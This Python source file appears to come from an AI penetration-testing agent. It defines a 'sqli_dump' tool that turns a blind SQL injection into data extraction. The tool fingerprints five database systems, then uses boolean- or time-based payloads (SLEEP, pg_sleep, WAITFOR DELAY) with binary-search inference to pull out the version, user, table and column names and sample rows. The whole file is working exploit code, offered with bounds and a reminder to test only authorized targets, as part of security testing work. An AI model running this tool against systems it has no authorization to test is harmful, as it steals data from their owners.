"""sqli_dump — turn a confirmed blind SQL injection into a real data extraction.

``injection_fuzz`` proves a parameter is injectable; it does not prove *impact*.
This tool does the operator's next move: fingerprint the DBMS, then extract data
by blind inference — DBMS/version, current db/user, table names, column names,
and a bounded sample of rows — over boolean-based or time-based oracles.

The extraction core is a pure binary-search inference engine parameterised by a
DBMS dialect and two boolean callables (``is length > n?`` / ``is codepoint at
position p > v?``). The HTTP layer is one implementation of those callables; the
self-check wires a second, in-memory implementation against a known secret so the
algorithm is verified without a live database. ~7 requests recover one character.

Extraction is deliberately bounded (default 5 tables, 8 columns, 3 rows, 64
chars/field) and reports what it capped — this is proof-of-impact, not
exfiltrate-everything. Only test authorized targets.
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass
from typing import TYPE_CHECKING, Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


if TYPE_CHECKING:
    from collections.abc import Callable

_SLEEP_SECONDS = 6
_DELAY_THRESHOLD_MS = 4500
_ASCII_HI = 127  # printable-range ceiling for the binary search


# --------------------------------------------------------------------------- #
# DBMS dialects                                                               #
# --------------------------------------------------------------------------- #


@dataclass(frozen=True)
class Dialect:
    name: str
    # substr(expr, pos, 1) and codepoint-of-char, as SQL fragments.
    substr: Callable[[str, int], str]
    codepoint: Callable[[str], str]
    length: Callable[[str], str]
    version_expr: str
    current_db_expr: str
    current_user_expr: str
    # scalar subqueries for the n-th table / column name (0-based offset).
    tables_expr: Callable[[int], str]
    columns_expr: Callable[[str, int], str]
    row_expr: Callable[[str, str, int], str]  # (table, column, row_offset)
    # a conditional sleep wrapping a boolean cond, or None when unsupported.
    time_cond: Callable[[str, int], str] | None
    # a probe that is TRUE only on this DBMS (used for fingerprinting).
    fingerprint_cond: str


def _mysql() -> Dialect:
    return Dialect(
        name="mysql",
        substr=lambda e, p: f"ASCII(SUBSTRING(({e}),{p},1))",
        codepoint=lambda e: e,
        length=lambda e: f"LENGTH(({e}))",
        version_expr="@@version",
        current_db_expr="database()",
        current_user_expr="current_user()",
        tables_expr=lambda n: (
            "SELECT table_name FROM information_schema.tables "  # nosec B608
            f"WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET {n}"
        ),
        columns_expr=lambda t, n: (
            "SELECT column_name FROM information_schema.columns "  # nosec B608
            f"WHERE table_name='{t}' ORDER BY ordinal_position LIMIT 1 OFFSET {n}"
        ),
        row_expr=lambda t, c, r: f"SELECT `{c}` FROM `{t}` LIMIT 1 OFFSET {r}",  # nosec B608
        time_cond=lambda cond, s: f"IF(({cond}),SLEEP({s}),0)",
        fingerprint_cond="@@version IS NOT NULL",
    )


def _postgres() -> Dialect:
    return Dialect(
        name="postgres",
        substr=lambda e, p: f"ASCII(SUBSTR(({e})::text,{p},1))",
        codepoint=lambda e: e,
        length=lambda e: f"LENGTH(({e})::text)",
        version_expr="version()",
        current_db_expr="current_database()",
        current_user_expr="current_user",
        tables_expr=lambda n: (
            "SELECT table_name FROM information_schema.tables "  # nosec B608
            "WHERE table_schema NOT IN ('pg_catalog','information_schema') "
            f"ORDER BY table_name LIMIT 1 OFFSET {n}"
        ),
        columns_expr=lambda t, n: (
            "SELECT column_name FROM information_schema.columns "  # nosec B608
            f"WHERE table_name='{t}' ORDER BY ordinal_position LIMIT 1 OFFSET {n}"
        ),
        row_expr=lambda t, c, r: f'SELECT "{c}"::text FROM "{t}" LIMIT 1 OFFSET {r}',  # nosec B608
        time_cond=lambda cond, s: (
            f"(CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({s})) ELSE 1 END)"  # nosec B608
        ),
        fingerprint_cond="version() ILIKE '%PostgreSQL%'",
    )


def _mssql() -> Dialect:
    return Dialect(
        name="mssql",
        substr=lambda e, p: f"ASCII(SUBSTRING(CAST(({e}) AS NVARCHAR(MAX)),{p},1))",
        codepoint=lambda e: e,
        length=lambda e: f"LEN(CAST(({e}) AS NVARCHAR(MAX)))",
        version_expr="@@version",
        current_db_expr="DB_NAME()",
        current_user_expr="SYSTEM_USER",
        tables_expr=lambda n: (
            f"SELECT name FROM sys.tables ORDER BY name OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"  # nosec B608
        ),
        columns_expr=lambda t, n: (
            "SELECT name FROM sys.columns "  # nosec B608
            f"WHERE object_id=OBJECT_ID('{t}') ORDER BY column_id "
            f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        ),
        row_expr=lambda t, c, r: (
            f"SELECT [{c}] FROM [{t}] ORDER BY 1 OFFSET {r} ROWS FETCH NEXT 1 ROWS ONLY"  # nosec B608
        ),
        time_cond=lambda cond, s: f"IF(({cond})) WAITFOR DELAY '0:0:{s}'",
        fingerprint_cond="@@version LIKE '%Microsoft%'",
    )


def _sqlite() -> Dialect:
    return Dialect(
        name="sqlite",
        substr=lambda e, p: f"UNICODE(SUBSTR(({e}),{p},1))",
        codepoint=lambda e: e,
        length=lambda e: f"LENGTH(({e}))",
        version_expr="sqlite_version()",
        current_db_expr="'main'",
        current_user_expr="'sqlite'",
        tables_expr=lambda n: (
            f"SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {n}"  # nosec B608
        ),
        columns_expr=lambda t, n: (
            f"SELECT name FROM pragma_table_info('{t}') ORDER BY cid LIMIT 1 OFFSET {n}"  # nosec B608
        ),
        row_expr=lambda t, c, r: f'SELECT "{c}" FROM "{t}" LIMIT 1 OFFSET {r}',  # nosec B608
        time_cond=None,  # SQLite has no sleep; boolean only.
        fingerprint_cond="sqlite_version() IS NOT NULL",
    )


def _oracle() -> Dialect:
    return Dialect(
        name="oracle",
        substr=lambda e, p: f"ASCII(SUBSTR(({e}),{p},1))",
        codepoint=lambda e: e,
        length=lambda e: f"LENGTH(({e}))",
        version_expr="(SELECT banner FROM v$version WHERE ROWNUM=1)",
        current_db_expr="(SELECT ora_database_name FROM dual)",
        current_user_expr="(SELECT user FROM dual)",
        tables_expr=lambda n: (
            "SELECT table_name FROM (SELECT table_name, ROWNUM rn FROM all_tables "  # nosec B608
            f"ORDER BY table_name) WHERE rn={n + 1}"
        ),
        columns_expr=lambda t, n: (
            "SELECT column_name FROM (SELECT column_name, ROWNUM rn FROM all_tab_columns "  # nosec B608
            f"WHERE table_name='{t}' ORDER BY column_id) WHERE rn={n + 1}"
        ),
        row_expr=lambda t, c, r: (
            f'SELECT "{c}" FROM (SELECT "{c}", ROWNUM rn FROM "{t}") WHERE rn={r + 1}'  # nosec B608
        ),
        time_cond=lambda cond, s: (
            f"(CASE WHEN ({cond}) THEN dbms_pipe.receive_message(('a'),{s}) ELSE 1 END)"
        ),
        fingerprint_cond="(SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL",
    )


_DIALECTS: dict[str, Callable[[], Dialect]] = {
    "mysql": _mysql,
    "postgres": _postgres,
    "mssql": _mssql,
    "sqlite": _sqlite,
    "oracle": _oracle,
}


# --------------------------------------------------------------------------- #
# Pure inference core (no HTTP — testable offline)                            #
# --------------------------------------------------------------------------- #


def _binary_search(ask_gt: Callable[[int], bool], lo: int, hi: int) -> int:
    """Smallest value v in [lo,hi] with not ask_gt(v); i.e. recover the value."""
    while lo < hi:
        mid = (lo + hi) // 2
        if ask_gt(mid):
            lo = mid + 1
        else:
            hi = mid
    return lo


def extract_length(ask_len_gt: Callable[[int], bool], max_len: int) -> int:
    """Recover LENGTH(expr), capped at max_len, via binary search."""
    if not ask_len_gt(0):
        return 0
    return _binary_search(ask_len_gt, 1, max_len)


def extract_string(
    ask_len_gt: Callable[[int], bool],
    ask_char_gt: Callable[[int, int], bool],
    max_len: int,
) -> str:
    """Recover a string via blind inference. ~7 oracle calls per character."""
    length = extract_length(ask_len_gt, max_len)
    chars: list[str] = []
    for pos in range(1, length + 1):

        def at(v: int, p: int = pos) -> bool:
            return ask_char_gt(p, v)

        code = _binary_search(at, 0, _ASCII_HI)
        if code == 0:
            break
        chars.append(chr(code))
    return "".join(chars)


# --------------------------------------------------------------------------- #
# HTTP oracle — builds the two callables from a live injection                #
# --------------------------------------------------------------------------- #


def _place(url: str, body: str | None, payload: str) -> tuple[str, str | None]:
    """Splice ``payload`` into the ``{PAYLOAD}`` slot of the URL or body."""
    if body and "{PAYLOAD}" in body:
        return url, body.replace("{PAYLOAD}", payload)
    if "{PAYLOAD}" in url:
        return url.replace("{PAYLOAD}", payload), body
    # No explicit slot: append to the last query param value.
    parsed = urlparse(url)
    q = parse_qs(parsed.query, keep_blank_values=True)
    if q:
        last = list(q)[-1]
        q[last] = [q[last][-1] + payload]
        flat = urlencode({k: v[-1] for k, v in q.items()})
        return urlunparse(parsed._replace(query=flat)), body
    return url + payload, body


class _HttpOracle:
    """Answers one boolean SQL condition per request, boolean- or time-based."""

    def __init__(
        self,
        url: str,
        method: str,
        headers: dict[str, str] | None,
        body: str | None,
        mode: str,
        true_marker: str | None,
        dialect: Dialect,
        timeout: int,
    ) -> None:
        self.url = url
        self.method = method
        self.headers = headers
        self.body = body
        self.mode = mode
        self.true_marker = true_marker
        self.dialect = dialect
        self.timeout = timeout
        self.requests = 0
        self._baseline_ms = 0.0

    def _send(self, payload: str) -> dict[str, Any]:
        self.requests += 1
        u, b = _place(self.url, self.body, payload)
        req_timeout = self.timeout + _SLEEP_SECONDS + 4
        return _replay_impl(self.method, u, self.headers, b, req_timeout, allow_redirects=False)

    def _boolean(self, cond: str) -> bool:
        if not self.true_marker:  # no marker => cannot decide a bit truthfully
            return False
        resp = self._send(f" AND ({cond})-- -")
        return bool(resp.get("success")) and self.true_marker in resp.get("body", "")

    def _time(self, cond: str) -> bool:
        if self.dialect.time_cond is None:
            return self._boolean(cond)
        wrapped = self.dialect.time_cond(cond, _SLEEP_SECONDS)
        resp = self._send(f" AND {wrapped}-- -")
        elapsed = resp.get("elapsed_ms") or 0
        return bool(resp.get("success")) and elapsed - self._baseline_ms >= _DELAY_THRESHOLD_MS

    def calibrate(self) -> None:
        base = self._send(" AND 1=1-- -")
        self._baseline_ms = base.get("elapsed_ms") or 0.0

    def ask(self, cond: str) -> bool:
        return self._boolean(cond) if self.mode == "boolean" else self._time(cond)

    # The two callables the inference core needs, for a given scalar ``expr``.
    def len_gt(self, expr: str) -> Callable[[int], bool]:
        return lambda n: self.ask(f"{self.dialect.length(expr)} > {n}")

    def char_gt(self, expr: str) -> Callable[[int, int], bool]:
        return lambda pos, val: self.ask(f"{self.dialect.substr(expr, pos)} > {val}")

    def read(self, expr: str, max_len: int) -> str:
        return extract_string(self.len_gt(expr), self.char_gt(expr), max_len)


# --------------------------------------------------------------------------- #
# Orchestration                                                               #
# --------------------------------------------------------------------------- #


def _fingerprint(oracle: _HttpOracle) -> str | None:
    for name, factory in _DIALECTS.items():
        d = factory()
        # Temporarily point the oracle at this dialect for its own probe.
        oracle.dialect = d
        if oracle.ask(d.fingerprint_cond):
            return name
    return None


def _sqli_impl(  # noqa: PLR0912
    url: str,
    oracle_mode: str,
    true_marker: str | None,
    dbms: str | None,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    max_tables: int,
    max_columns: int,
    max_rows: int,
    max_field_len: int,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if oracle_mode == "boolean" and not true_marker:
        return {"success": False, "error": "boolean oracle requires true_marker"}
    if oracle_mode not in ("boolean", "time"):
        return {"success": False, "error": "oracle must be 'boolean' or 'time'"}

    oracle = _HttpOracle(url, method, headers, body, oracle_mode, true_marker, _mysql(), timeout)
    if oracle_mode == "time":
        oracle.calibrate()

    dbms = dbms or _fingerprint(oracle)
    if not dbms or dbms not in _DIALECTS:
        return {
            "success": True,
            "vulnerable": False,
            "error": "could not fingerprint DBMS (try passing dbms=)",
            "requests_sent": oracle.requests,
        }
    dialect = _DIALECTS[dbms]()
    oracle.dialect = dialect

    version = oracle.read(dialect.version_expr, max_field_len)
    current_db = oracle.read(dialect.current_db_expr, max_field_len)
    current_user = oracle.read(dialect.current_user_expr, max_field_len)

    capped: list[str] = []
    tables: list[str] = []
    for n in range(max_tables):
        name = oracle.read(dialect.tables_expr(n), max_field_len)
        if not name:
            break
        tables.append(name)
    else:
        capped.append(f"tables capped at {max_tables}")

    sample: dict[str, Any] = {}
    if tables:
        target = tables[0]
        columns: list[str] = []
        for n in range(max_columns):
            col = oracle.read(dialect.columns_expr(target, n), max_field_len)
            if not col:
                break
            columns.append(col)
        else:
            capped.append(f"columns capped at {max_columns}")

        rows: list[dict[str, str]] = []
        for r in range(max_rows):
            row: dict[str, str] = {}
            empty = True
            for col in columns:
                val = oracle.read(dialect.row_expr(target, col, r), max_field_len)
                row[col] = val
                empty = empty and not val
            if empty:
                break
            rows.append(row)
        else:
            if rows:
                capped.append(f"rows capped at {max_rows}")
        sample = {"table": target, "columns": columns, "rows": rows}

    return {
        "success": True,
        "vulnerable": bool(version or tables),
        "dbms": dbms,
        "version": version,
        "current_db": current_db,
        "current_user": current_user,
        "tables": tables,
        "sample": sample,
        "requests_sent": oracle.requests,
        "capped": capped,
    }


@function_tool(timeout=1200, strict_mode=False)
async def sqli_dump(
    ctx: RunContextWrapper,
    url: str,
    oracle: str = "boolean",
    true_marker: str | None = None,
    dbms: str | None = None,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    max_tables: int = 5,
    max_columns: int = 8,
    max_rows: int = 3,
    max_field_len: int = 64,
    timeout: int = 15,
) -> str:
    """Extract data from a confirmed blind SQL injection (boolean or time-based).

    Put a ``{PAYLOAD}`` slot where SQL should be spliced (in ``url`` or ``body``),
    e.g. ``http://t/item?id=1{PAYLOAD}``; without a slot the payload is appended to
    the last query value. Extraction is bounded and reports what it ``capped``.
    Only test authorized targets.

    Returns JSON with ``dbms``, ``version``, ``current_db``, ``current_user``,
    ``tables``, ``sample`` (table/columns/rows), ``requests_sent`` and ``capped``.

    Args:
        url: Injectable URL, ideally with a ``{PAYLOAD}`` slot.
        oracle: ``boolean`` (needs ``true_marker``) or ``time`` (latency-based).
        true_marker: Substring present iff the injected condition is TRUE (boolean mode).
        dbms: Skip fingerprinting — one of mysql/postgres/mssql/sqlite/oracle.
        method: HTTP method (default GET).
        headers: Extra request headers (e.g. auth).
        body: Raw body; may hold the ``{PAYLOAD}`` slot.
        max_tables: Max table names to enumerate (default 5).
        max_columns: Max columns of the first table (default 8).
        max_rows: Max sample rows (default 3).
        max_field_len: Max characters per extracted field (default 64).
        timeout: Base per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _sqli_impl,
            url,
            oracle,
            true_marker,
            dbms,
            method,
            headers,
            body,
            max_tables,
            max_columns,
            max_rows,
            max_field_len,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
